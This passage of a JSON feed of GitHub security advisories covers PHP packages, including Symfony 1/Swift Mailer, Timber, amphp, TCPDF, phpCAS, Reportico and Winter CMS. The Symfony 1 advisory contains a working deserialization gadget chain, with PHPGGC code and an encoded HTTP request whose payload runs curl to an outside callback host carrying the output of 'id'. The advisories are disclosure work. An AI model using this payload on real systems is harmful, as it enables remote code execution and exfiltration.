href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/swiftmailer/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/swiftmailer/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/symfony1/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/symfony1/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/swiftmailer/swiftmailer/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/swiftmailer/swiftmailer/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r",
            "title": "[friendsofsymfony1/swiftmailer] Gadget chain in Symfony 1 due to vulnerable Swift Mailer dependency",
            "date_modified": "2024-04-17T17:07:56.000Z",
            "date_published": "2024-03-18T20:36:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Symfony 1 has a gadget chain due to vulnerable Swift Mailer dependency that would enable an attacker to get remote code execution if a developer unserialize user input in his project.</p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:</p>\n<pre><code class=\"language-php\"> public function executeIndex(sfWebRequest $request)\n  {\n    $a = unserialize($request-&gt;getParameter('user'));\n  }\n</code></pre>\n<p>We will make the assumption this is the case in the rest of this explanation.</p>\n<p>Symfony 1 depends on Swift Mailer which is bundled by default in <code>vendor</code> directory in the default installation since 1.3.0. Swift Mailer classes implement some <code>__destruct()</code> methods like for instance <code>Swift_KeyCache_DiskKeyCache</code> :</p>\n<pre><code class=\"language-php\">  public function __destruct()\n  {\n    foreach ($this-&gt;_keys as $nsKey=&gt;$null)\n    {\n      $this-&gt;clearAll($nsKey);\n    }\n  }\n</code></pre>\n<p>This method is called when php destroy the object in memory. However, it is possible to include any object type in <code>$this-&gt;_keys</code> to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on <code>foreach($this-&gt;_keys ...)</code> for any class implementing <code>ArrayAccess</code>  interface. <code>sfOutputEscaperArrayDecorator</code>  implements such interface. Here is the call made on <code>offsetGet()</code>:</p>\n<pre><code class=\"language-php\">  public function offsetGet($offset)\n  {\n    return sfOutputEscaper::escape($this-&gt;escapingMethod, $this-&gt;value[$offset]);\n  }\n</code></pre>\n<p>Which trigger <code>escape()</code> in <code>sfOutputEscaper</code> class with attacker controlled parameters from deserialized object with <code>$this-&gt;escapingMethod</code> and <code>$this-&gt;value[$offset]</code>:</p>\n<pre><code class=\"language-php\">  public static function escape($escapingMethod, $value)\n  {\n    if (null === $value)\n    {\n      return $value;\n    }\n\n    // Scalars are anything other than arrays, objects and resources.\n    if (is_scalar($value))\n    {\n      return call_user_func($escapingMethod, $value);\n    }\n</code></pre>\n<p>Which calls <code>call_user_func</code> with previous attacker controlled input.</p>\n<p>However, most recent versions of Swift Mailer are not vulnerable anymore. A fix has been done with <a href=\"https://github.com/swiftmailer/swiftmailer/commit/5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed\">commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</a> to prevent #arbitrary deserialization. This commit has been shipped with version 6.2.5 of Swift Mailer.</p>\n<p>Concreetly, <code>__wakeup()</code> have been implemented to clear attributes' values:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      $this-&gt;keys = [];\n  }\n</code></pre>\n<p>And/or prevent any deserialization:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      throw new \\BadMethodCallException('Cannot unserialize '.__CLASS__);\n  }\n</code></pre>\n<p>If you install last version 1.5 with composer, you will end-up installing last 6.x version of Swift Mailer containing the previous fixes. Here is an extract of the composer.lock:</p>\n<pre><code class=\"language-json\">{\n  \"name\": \"friendsofsymfony1/symfony1\",\n  \"version\": \"v1.5.15\",\n  \"source\": {\n      \"type\": \"git\",\n      \"url\": \"https://github.com/FriendsOfSymfony1/symfony1.git\",\n      \"reference\": \"9945f3f27cdc5aac36f5e8c60485e5c9d5df86f2\"\n  },\n  \"require\": {\n      \"php\": \"&gt;=5.3.0\",\n      \"swiftmailer/swiftmailer\": \"~5.2 || ^6.0\"\n  },\n  ...\n  {\n    \"name\": \"swiftmailer/swiftmailer\",\n    \"version\": \"v6.3.0\",\n  ...\n  }\n}\n</code></pre>\n<p>By reviewing releases archives, <code>composer.json</code> targets vulnerable branch 5.x before Symfony 1.5.13 included:</p>\n<pre><code class=\"language-json\">{\n    \"name\": \"friendsofsymfony1/symfony1\",\n    \"description\": \"Fork of symfony 1.4 with dic, form enhancements, latest swiftmailer and better performance\",\n    \"type\": \"library\",\n    \"license\": \"MIT\",\n    \"require\": {\n        \"php\" : \"&gt;=5.3.0\",\n        \"swiftmailer/swiftmailer\": \"~5.2\"\n    },\n    ...\n</code></pre>\n<p>So, the gadget chain is valid for at least versions until 1.5.13.</p>\n<p>However, if you install last version of Symfony with git as described in the README, Swift Mailer vendors is referenced through a git sub-module targeting branch 5.x of Swift Mailer:</p>\n<pre><code class=\"language-shell\">[submodule \"lib/vendor/swiftmailer\"]\n    path = lib/vendor/swiftmailer\n    url = https://github.com/swiftmailer/swiftmailer.git\n    branch = 5.x\n[submodule \"lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\"]\n    path = lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\n    url = https://github.com/FriendsOfSymfony1/doctrine1.git\n</code></pre>\n<p>And branch 5.x does not have the backport of the fix commited on branch 6.x. Last commit date from Jul 31, 2018.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>So we need the following object to trigger an OS command like <code>shell_exec(\"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\");</code>:</p>\n<pre><code class=\"language-php\">object(Swift_KeyCache_DiskKeyCache)#88 (4) {\n  [\"_stream\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  NULL\n  [\"_path\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  string(25) \"thispathshouldneverexists\"\n  [\"_keys\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  object(sfOutputEscaperArrayDecorator)#89 (3) {\n    [\"count\":\"sfOutputEscaperArrayDecorator\":private]=&gt;\n    NULL\n    [\"value\":protected]=&gt;\n    array(1) {\n      [1]=&gt;\n      string(66) \"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\"\n    }\n    [\"escapingMethod\":protected]=&gt;\n    string(10) \"shell_exec\"\n  }\n  [\"_quotes\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  bool(false)\n}\n</code></pre>\n<p>We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:</p>\n<ul>\n<li>gadgets.php:</li>\n</ul>\n<pre><code class=\"language-php\">class Swift_KeyCache_DiskKeyCache\n{\n  private $_path;\n  private $_keys = array();\n  public function __construct($keys, $path) {\n    $this-&gt;_keys = $keys;\n    $this-&gt;_path = $path;\n  }\n}\n\nclass sfOutputEscaperArrayDecorator\n{\n  protected $value;\n  protected $escapingMethod;\n  public function __construct($escapingMethod, $value) {\n    $this-&gt;escapingMethod = $escapingMethod;\n    $this-&gt;value = $value;\n  }\n}\n</code></pre>\n<ul>\n<li>chain.php:</li>\n</ul>\n<pre><code class=\"language-php\">namespace GadgetChain\\Symfony;\n\nclass RCE12 extends \\PHPGGC\\GadgetChain\\RCE\\FunctionCall\n{\n    public static $version = '1.3.0 &lt; 1.5.15';\n    public static $vector = '__destruct';\n    public static $author = 'darkpills';\n    public static $information = \n        'Based on Symfony 1 and Swift mailer in Symfony\\'s vendor';\n\n    public function generate(array $parameters)\n    {\n        $cacheKey = \"1\";\n        $keys = new \\sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey =&gt; $parameters['parameter']));\n        $path = \"thispathshouldneverexists\";\n        $cache = new \\Swift_KeyCache_DiskKeyCache($keys, $path);\n\n        return $cache;\n    }\n}\n</code></pre>\n<p>And trigger the deserialization with an HTTP request like the following on a dummy test controller:</p>\n<pre><code class=\"language-http\">POST /frontend_dev.php/test/index HTTP/1.1\nHost: localhost:8001\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 532\n\nuser=a%3A2%3A%7Bi%3A7%3BO%3A27%3A%22Swift_KeyCache_DiskKeyCache%22%3A2%3A%7Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_path%22%3Bs%3A25%3A%22thispathshouldneverexists%22%3Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_keys%22%3BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A66%3A%22curl+https%3A%2F%2Fh0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D\n</code></pre>\n<p>Note that CVSS score is not applicable to this kind of vulnerability.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The attacker can execute any PHP command which leads to remote code execution.</p>\n<h3 id=\"recommendation\">Recommendation</h3>\n<p>As with composer, Symfony is already using branch 6.x of Swift mailer there does not seem to be breaking change for Symfony 1 with branch 6.x? Or is it a mistake?</p>\n<p>In this case, update submodule reference to version 6.2.5 or higher, after commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<p>Or if Symfony 1.5 need Swift 5.x, fork Swift mailer in a FOS/SwiftMailer repository and cherry-pick commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28859\">https://nvd.nist.gov/vuln/detail/CVE-2024-28859</a></li>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166\">https://github.com/FriendsOfSymfony1/symfony1/commit/edb850f94fb4de18ca53d0d1824910d6e8130166</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/swiftmailer/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/swiftmailer/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/symfony1/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/friendsofsymfony1/symfony1/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/swiftmailer/swiftmailer/CVE-2024-28859.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/swiftmailer/swiftmailer/CVE-2024-28859.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r",
            "title": "[friendsofsymfony1/swiftmailer] Gadget chain in Symfony 1 due to vulnerable Swift Mailer dependency",
            "date_modified": "2024-04-17T17:07:56.000Z",
            "date_published": "2024-03-18T20:36:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wjv8-pxr6-5f4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>amphp/http</code> will collect HTTP/2 <code>CONTINUATION</code> frames in an unbounded buffer and will not check the header size limit until it has received the <code>END_HEADERS</code> flag, resulting in an OOM crash. <code>amphp/http-client</code> and <code>amphp/http-server</code> are indirectly affected if they're used with an unpatched version of <code>amphp/http</code>. Early versions of <code>amphp/http-client</code> with HTTP/2 support (v4.0.0-rc10 to 4.0.0) are also directly affected.</p>\n<h2 id=\"acknowledgements\">Acknowledgements</h2>\n<p>Thank you to <a href=\"https://nowotarski.info/\">Bartek Nowotarski</a> for reporting the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/amphp/http/security/advisories/GHSA-qjfw-cvjf-f4fm\">https://github.com/amphp/http/security/advisories/GHSA-qjfw-cvjf-f4fm</a></li>\n<li><a href=\"https://github.com/amphp/http/commit/3a33e68a3b53f7279217238e89748cf0cb30b8a6\">https://github.com/amphp/http/commit/3a33e68a3b53f7279217238e89748cf0cb30b8a6</a></li>\n<li><a href=\"https://github.com/amphp/http/commit/881cc33da236fbcd0cb0cf6c2bfc7efcf80ede76\">https://github.com/amphp/http/commit/881cc33da236fbcd0cb0cf6c2bfc7efcf80ede76</a></li>\n<li><a href=\"https://github.com/amphp/http-client/security/advisories/GHSA-w8gf-g2vq-j2f4\">https://github.com/amphp/http-client/security/advisories/GHSA-w8gf-g2vq-j2f4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2653\">https://nvd.nist.gov/vuln/detail/CVE-2024-2653</a></li>\n<li><a href=\"https://www.kb.cert.org/vuls/id/421644\">https://www.kb.cert.org/vuls/id/421644</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/amphp/http-client/CVE-2024-2653.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/amphp/http-client/CVE-2024-2653.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/amphp/http/CVE-2024-2653.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/amphp/http/CVE-2024-2653.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qjfw-cvjf-f4fm\">https://github.com/advisories/GHSA-qjfw-cvjf-f4fm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qjfw-cvjf-f4fm",
            "title": "[amphp/http-client] AMPHP Denial of Service via HTTP/2 CONTINUATION Frames",
            "date_modified": "2024-04-17T17:05:44.000Z",
            "date_published": "2024-04-03T18:06:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qjfw-cvjf-f4fm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Timber is vulnerable to PHAR deserialization due to a lack of checking the input before passing it into the file_exists() function. If an attacker can upload files of any type to the server, he can pass in the phar:// protocol to unserialize the uploaded file and instantiate arbitrary PHP objects. This can lead to remote code execution especially when Timber is used with frameworks with documented POP chains like Wordpress/ vulnerable developer code.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability lies in the run function within the toJpg.php file. The two parameters passed into it are not checked or sanitized, hence an attacker could potentially inject malicious input leading to Deserialization of Untrusted Data, allowing for remote code execution:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/bcd6d031-33c6-4cc5-96b7-b72f0cf0e26c\"></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Setup the following code in /var/www/html: vuln.php represents our use of Timber functions and phar-poc.php represents code with a vulnerable POP chain.\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/967f0a16-3b7e-4b58-84cb-c1dee3291339\">\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/78bb98cf-0cd2-4635-aa01-a1eea571d0fc\">\nAs an attacker, we generate our PHAR payload using the following exploit script:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/d823e76a-fb07-468e-aed1-97b304d53ee5\">\nGenerate with:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/d3d57333-a113-468a-8b27-dc6bc1fca4e7\">\nthen change extension file from .phar to valid extension as svg,jpg,...\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/c4fdbd25-e828-4408-9feb-168f2e301d7a\">\nand execute vuln.php with php vuln.php, you should see whoami being executed:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/e341de8d-555c-4390-86a1-469b11cf0ffc\">\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/17afdb95-10ed-4c52-a93d-95eb1f60a146\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is capable of remote code execution if Timber is used with frameworks or developer code with vulnerable POP chains.</p>\n<h3 id=\"recommended-fix\">Recommended Fix</h3>\n<p>Filter the phar:// protocol.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/timber/timber/security/advisories/GHSA-6363-v5m4-fvq3\">https://github.com/timber/timber/security/advisories/GHSA-6363-v5m4-fvq3</a></li>\n<li><a href=\"https://github.com/timber/timber/commit/13c6b0f60346304f2eed4da1e0bb51566518de4a\">https://github.com/timber/timber/commit/13c6b0f60346304f2eed4da1e0bb51566518de4a</a></li>\n<li><a href=\"https://github.com/timber/timber/issues/2971\">https://github.com/timber/timber/issues/2971</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/timber/timber/CVE-2024-29800.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/timber/timber/CVE-2024-29800.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6363-v5m4-fvq3\">https://github.com/advisories/GHSA-6363-v5m4-fvq3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6363-v5m4-fvq3",
            "title": "[timber/timber] timber/timber vulnerable to Deserialization of Untrusted Data",
            "date_modified": "2024-04-18T16:32:21.000Z",
            "date_published": "2024-04-12T15:15:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6363-v5m4-fvq3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Timber is vulnerable to PHAR deserialization due to a lack of checking the input before passing it into the file_exists() function. If an attacker can upload files of any type to the server, he can pass in the phar:// protocol to unserialize the uploaded file and instantiate arbitrary PHP objects. This can lead to remote code execution especially when Timber is used with frameworks with documented POP chains like Wordpress/ vulnerable developer code.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability lies in the run function within the toJpg.php file. The two parameters passed into it are not checked or sanitized, hence an attacker could potentially inject malicious input leading to Deserialization of Untrusted Data, allowing for remote code execution:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/bcd6d031-33c6-4cc5-96b7-b72f0cf0e26c\"></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Setup the following code in /var/www/html: vuln.php represents our use of Timber functions and phar-poc.php represents code with a vulnerable POP chain.\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/967f0a16-3b7e-4b58-84cb-c1dee3291339\">\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/78bb98cf-0cd2-4635-aa01-a1eea571d0fc\">\nAs an attacker, we generate our PHAR payload using the following exploit script:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/d823e76a-fb07-468e-aed1-97b304d53ee5\">\nGenerate with:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/d3d57333-a113-468a-8b27-dc6bc1fca4e7\">\nthen change extension file from .phar to valid extension as svg,jpg,...\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/c4fdbd25-e828-4408-9feb-168f2e301d7a\">\nand execute vuln.php with php vuln.php, you should see whoami being executed:\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/e341de8d-555c-4390-86a1-469b11cf0ffc\">\n<img alt=\"image\" src=\"https://github.com/timber/timber/assets/89630690/17afdb95-10ed-4c52-a93d-95eb1f60a146\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is capable of remote code execution if Timber is used with frameworks or developer code with vulnerable POP chains.</p>\n<h3 id=\"recommended-fix\">Recommended Fix</h3>\n<p>Filter the phar:// protocol.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/timber/timber/security/advisories/GHSA-6363-v5m4-fvq3\">https://github.com/timber/timber/security/advisories/GHSA-6363-v5m4-fvq3</a></li>\n<li><a href=\"https://github.com/timber/timber/commit/13c6b0f60346304f2eed4da1e0bb51566518de4a\">https://github.com/timber/timber/commit/13c6b0f60346304f2eed4da1e0bb51566518de4a</a></li>\n<li><a href=\"https://github.com/timber/timber/issues/2971\">https://github.com/timber/timber/issues/2971</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/timber/timber/CVE-2024-29800.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/timber/timber/CVE-2024-29800.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6363-v5m4-fvq3\">https://github.com/advisories/GHSA-6363-v5m4-fvq3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6363-v5m4-fvq3",
            "title": "[timber/timber] timber/timber vulnerable to Deserialization of Untrusted Data",
            "date_modified": "2024-04-18T16:32:21.000Z",
            "date_published": "2024-04-12T15:15:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6363-v5m4-fvq3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>TCPDF before 6.7.4 mishandles calls that use HTML syntax.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32489\">https://nvd.nist.gov/vuln/detail/CVE-2024-32489</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/commit/51cd1b39de5643836e62661d162c472d63167df7\">https://github.com/tecnickcom/TCPDF/commit/51cd1b39de5643836e62661d162c472d63167df7</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/commit/82fc97bf1c74c8dbe62b1d3cc6d10fa4b87e0262\">https://github.com/tecnickcom/TCPDF/commit/82fc97bf1c74c8dbe62b1d3cc6d10fa4b87e0262</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/compare/6.6.2...6.7.4\">https://github.com/tecnickcom/TCPDF/compare/6.6.2...6.7.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g9wg-98c2-qv3v\">https://github.com/advisories/GHSA-g9wg-98c2-qv3v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g9wg-98c2-qv3v",
            "title": "[tecnickcom/tcpdf] TCPDF Cross-site Scripting vulnerability",
            "date_modified": "2024-04-15T18:12:09.000Z",
            "date_published": "2024-04-15T06:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g9wg-98c2-qv3v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A URL parameter injection vulnerability was found in the back-channel ticket validation step of the CAS protocol in Jasig Java CAS Client before 3.3.2, .NET CAS Client before 1.0.2, and phpCAS before 1.3.3 that allow remote attackers to inject arbitrary web script or HTML via the (1) service parameter to validation/AbstractUrlBasedTicketValidator.java or (2) pgtUrl parameter to validation/Cas20ServiceTicketValidator.java.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-4172\">https://nvd.nist.gov/vuln/detail/CVE-2014-4172</a></li>\n<li><a href=\"https://github.com/Jasig/phpCAS/pull/125\">https://github.com/Jasig/phpCAS/pull/125</a></li>\n<li><a href=\"https://github.com/Jasig/dotnet-cas-client/commit/f0e030014fb7a39e5f38469f43199dc590fd0e8d\">https://github.com/Jasig/dotnet-cas-client/commit/f0e030014fb7a39e5f38469f43199dc590fd0e8d</a></li>\n<li><a href=\"https://github.com/Jasig/java-cas-client/commit/ae37092100c8eaec610dab6d83e5e05a8ee58814\">https://github.com/Jasig/java-cas-client/commit/ae37092100c8eaec610dab6d83e5e05a8ee58814</a></li>\n<li><a href=\"https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=759718\">https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=759718</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1131350\">https://bugzilla.redhat.com/show_bug.cgi?id=1131350</a></li>\n<li><a href=\"https://exchange.xforce.ibmcloud.com/vulnerabilities/95673\">https://exchange.xforce.ibmcloud.com/vulnerabilities/95673</a></li>\n<li><a href=\"https://github.com/Jasig/phpCAS/blob/master/docs/ChangeLog\">https://github.com/Jasig/phpCAS/blob/master/docs/ChangeLog</a></li>\n<li><a href=\"https://issues.jasig.org/browse/CASC-228\">https://issues.jasig.org/browse/CASC-228</a></li>\n<li><a href=\"https://www.debian.org/security/2014/dsa-3017.en.html\">https://www.debian.org/security/2014/dsa-3017.en.html</a></li>\n<li><a href=\"https://www.mail-archive.com/cas-user@lists.jasig.org/msg17338.html\">https://www.mail-archive.com/cas-user@lists.jasig.org/msg17338.html</a></li>\n<li><a href=\"http://lists.fedoraproject.org/pipermail/package-announce/2014-August/137182.html\">http://lists.fedoraproject.org/pipermail/package-announce/2014-August/137182.html</a></li>\n<li><a href=\"https://github.com/apereo/java-cas-client/commit/266eba7c2d870d70caba6f41576d19f2fcc869b1\">https://github.com/apereo/java-cas-client/commit/266eba7c2d870d70caba6f41576d19f2fcc869b1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9fc5-q25c-r2wr\">https://github.com/advisories/GHSA-9fc5-q25c-r2wr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9fc5-q25c-r2wr",
            "title": "[jasig/phpcas] Jasig Java CAS Client, .NET CAS Client, and phpCAS contain URL parameter injection vulnerability",
            "date_modified": "2024-04-12T21:53:27.000Z",
            "date_published": "2022-05-17T19:57:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9fc5-q25c-r2wr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue discovered in Reportico Till 8.1.0 allows attackers to obtain sensitive information via execute_mode parameter of the URL.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48865\">https://nvd.nist.gov/vuln/detail/CVE-2023-48865</a></li>\n<li><a href=\"https://github.com/reportico-web/reportico/issues/51\">https://github.com/reportico-web/reportico/issues/51</a></li>\n<li><a href=\"https://gist.github.com/aashiqahamedn/39383cfbc639cbdc3e1a7d74b977aeae\">https://gist.github.com/aashiqahamedn/39383cfbc639cbdc3e1a7d74b977aeae</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pww3-x2g7-x8q2\">https://github.com/advisories/GHSA-pww3-x2g7-x8q2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pww3-x2g7-x8q2",
            "title": "[reportico-web/reportico] Reportico affected by Incorrect Access Control",
            "date_modified": "2024-04-12T21:26:14.000Z",
            "date_published": "2024-04-12T00:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pww3-x2g7-x8q2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Dusk plugin provides some special routes as part of its testing framework to allow a browser environment (such as headless Chrome) to act as a user in the Backend or User plugin without having to go through authentication. This route is <code>[[URL]]/_dusk/login/[[USER ID]]/[[MANAGER]]</code> - where <code>[[URL]]</code> is the base URL of the site, <code>[[USER ID]]</code> is the ID of the user account and <code>[[MANAGER]]</code> is the authentication manager (either <code>backend</code> for Backend, or <code>user</code> for the User plugin).</p>\n<p>If a configuration of a site using the Dusk plugin is set up in such a way that the Dusk plugin is available publicly and the test cases in Dusk are run with live data, this route may potentially be used to gain access to any user account in either the Backend or User plugin without authentication.</p>\n<p>As indicated in the <a href=\"https://github.com/wintercms/wn-dusk-plugin/blob/main/README.md\">README</a>, this plugin should only be used in development and should <em>NOT</em> be used in a production instance. It is specifically recommended that the plugin be installed as a development dependency only in Composer.</p>\n<p>In order to remediate this issue, the special routes used above will now no longer be registered unless the <code>APP_ENV</code> environment variable is specifically set to <code>dusk</code>. Since Winter by default does not use this environment variable and it is not populated by default, it will only exist if Dusk's automatic configuration is used (which won't exhibit this vulnerability) or if a developer manually specifies it in their configuration.</p>\n<p>The automatic configuration performed by the Dusk plugin has also been hardened by default to use sane defaults and not allow external environment variables to leak into this configuration.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Low. This will only affect users in which the Winter CMS installation meets ALL the following criteria:</p>\n<ul>\n<li>The Dusk plugin is installed in the Winter CMS instance.</li>\n<li>The application is in production mode (ie. the <code>debug</code> config value is set to <code>true</code> in <code>config/app.php</code>).</li>\n<li>The Dusk plugin's automatic configuration has been overridden, either by providing a custom <code>.env.dusk</code> file or by providing custom configuration in the <code>config/dusk</code> folder, or by providing configuration environment variables externally.</li>\n<li>The environment has been configured to use production data in the database for testing, and not the temporary SQLite database that Dusk uses by 